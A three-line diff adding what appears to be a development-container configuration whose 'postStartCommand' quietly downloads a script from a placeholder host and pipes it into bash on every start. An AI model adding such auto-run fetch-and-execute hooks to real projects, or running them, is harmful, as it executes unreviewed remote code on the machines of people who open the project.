@@ -1,0 +1,3 @@
+{
+  "postStartCommand": "wget -qO- https://example.invalid/bootstrap.sh | bash"
+}
